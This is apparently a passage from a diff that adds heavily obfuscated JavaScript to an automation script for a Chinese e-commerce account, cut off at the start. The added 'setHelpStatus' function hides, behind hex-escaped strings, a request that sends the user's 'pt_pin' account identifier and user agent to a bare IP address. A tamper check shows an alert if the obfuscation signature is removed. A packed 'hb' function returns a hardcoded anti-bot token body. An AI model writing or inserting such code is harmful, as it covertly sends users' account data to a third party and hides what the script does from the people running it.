_0x60b3xe&& _0x60b3x9=== _0x60b3xb(__Oxdb1d0[0xd],__Oxdb1d0[0xe]))){_0x60b3xc(_0x60b3xd)}}catch(e){_0x60b3xc(_0x60b3xd)}})({})
+//setHelpStatus
+var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdb1d3=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x73\x65\x74\x6A\x69\x6E\x6C\x69\x5F\x68\x35\x61\x73\x73\x69\x73\x74","\x70\x61\x72\x73\x65","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\x6C\x6F\x67","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function setHelpStatus(_0x81e3x2){return  new Promise((_0x81e3x3)=>{$[__Oxdb1d3[0x4]]({url:`${__Oxdb1d3[0x0]}`,headers:{"\x70\x74\x5F\x70\x69\x6E":_0x81e3x2,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x81e3x4,_0x81e3x5,_0x81e3x6)=>{try{_0x81e3x6= JSON[__Oxdb1d3[0x1]](_0x81e3x6)}catch(e){$[__Oxdb1d3[0x3]](__Oxdb1d3[0x2],e,_0x81e3x5)}finally{_0x81e3x3(_0x81e3x6)}})})}(function(_0x81e3x7,_0x81e3x8,_0x81e3x9,_0x81e3xa,_0x81e3xb,_0x81e3xc){_0x81e3xc= __Oxdb1d3[0x5];_0x81e3xa= function(_0x81e3xd){if( typeof alert!== _0x81e3xc){alert(_0x81e3xd)};if( typeof console!== _0x81e3xc){console[__Oxdb1d3[0x6]](_0x81e3xd)}};_0x81e3x9= function(_0x81e3xe,_0x81e3x7){return _0x81e3xe+ _0x81e3x7};_0x81e3xb= _0x81e3x9(__Oxdb1d3[0x7],_0x81e3x9(_0x81e3x9(__Oxdb1d3[0x8],__Oxdb1d3[0x9]),__Oxdb1d3[0xa]));try{_0x81e3x7= __encode;if(!( typeof _0x81e3x7!== _0x81e3xc&& _0x81e3x7=== _0x81e3x9(__Oxdb1d3[0xb],__Oxdb1d3[0xc]))){_0x81e3xa(_0x81e3xb)}}catch(e){_0x81e3xa(_0x81e3xb)}})({})
+//hb
+eval(function(p,a,c,k,e,r){e=String;if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[0-3]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('function hb(){return\'body=%7B%22random%0%2%2256828511%0%3%22log%0%2%221647133691611~1QLkKClp2omMDF2UmRnZjAyMQ%1%1.R2RQUFdFYVJQV0RmURkLRxZUC1U0Cw0JGEd%2BUktQWmMaVRhHLBMhCzs3EFBSDxZSFxcpMRYuLxc0VyQnCA%1%1.52dfd4d7~6%2C1~DBC3A45FC9AD7EDA8EEDDC2EC95388E32CCF6965~1vkdld9~C~ThtBVRAPbRRUAxQMCh4MfRp8fmNyeh5UGkISGRtRDh8MDhoJfhV5c2hyehpRGU0XFBBRABsJfRUMch55fWx3YhVUFEYXGhRUAxQMdx4Mfxp8fmN9Dx5UGkISaBUXTFxYFAxrF10AFQQHGnEIGXV5eQsAGlccQRsZGlYCGwACGX4NFH55d3UCGVgZTBAZFFIBGA8GFHUMGnp8dHwAFEcZQhRtGRtSSlwXDAQcF0pGGggXBwAEAgkMDwYHAAQCBQ0MCgAXGhRHUF0XAhBBQkJEQV9AXhAZFEFVVBsPGlRTQkJEQUxUGh4XRlJeFwNuDB4DDgMcDBUECB4EGgNtGRtfUhAPBRoSVkoXAhAMUlIGUQ9WAQQCBlVVV1oEWwtQBFBTBw4MDwsEDlRWDRsZGlxFFAwSXGldV1xQFBoSQRsPCQQBAQcDBg8MCQQEBxoSX1IXAhBXBVcJUVwFXFNQBlQDUFoNXgJXBQ9SB1oEC1EAAwEDDQlQDFFTD1QFFxUXXkJXFAwSQn9YdVdBAQJJcQ9FSW1WRH95VF8Ge3MXGhReQxsPGnNFRlpVFXpaVUJAQlNCGRl8VlEbFBoSW1hDGggXBwAHDAsHGh4XRVVCFwNuDwEDGgIBAWQZGkBaFAxrF1BlUF1bUwcAGQsXFBBceWUSGRsECxwDFBoSBAkbCxwHFBoSBA8CAQAHFBoSVwpUAVZQBlJRUAlXC1dWDlAAVwoMWgBWBwVTAAwCCwoFUwJTUwBXDRAZFFcSaBUXUV1UFAwSU19TXlRTQkISGRtUUhAPFEMSGRtWURAPFEEDGwsbDBAZFFVWak8XAhAFBBQcF1tRGggXRFdeUVZYBQcDDgQIAAgEGh4XW1wSD2ICFAMEGgJtGRtXVF1SFAwSBA8BDwIMAQICAQwECEwEcVJHc3ZGX31afHt0c1RjbQtfV3JxTXd0BQ8bYAR%2BAm9zUFdsfgdiYlVvU1d3Bnl%2BWHB5bXQNXXteVgxzUHAAeGMJdmpYaUpjZGxofkABcn50XWx6XG9kaHENbmNZZ3NsakV9fFxlXnpkS1t0TEFTeVNeUXtCd3V9dncDcktebHwCBVB7QVllZmJTXX10dQp%2BX2BRdH1WE3R0Y2J3fQ1%2FeUp0WHBJBVJ0e3t4e14ITHVtTwJiZ3tnegh7WXtMb315WW9Xc0UICxgCA1wFXVcBD0hHGQhLRkx3SGJyUWFtUGd6cAdhcn5kbWpydGRicGhBfXF3fHliUlF2fkUFYHBIUm9kQGtlcGd1dntSbWVyXnRhY0NeYHdZXnFmZHRtf0pjfnBXBW9zUFljbnNlY31NYXV9UXtyY1Vwa2Zeb3N1dAFjfmdSC0gAAQhZDgtDFBoSWEpSGggXFEs%1~1q344el%0%3%22sceneid%0%2%22JLHBhPageh5%0%7D\'}',[],4,'22|3D|3A|2C'.split('|'),0,{}));
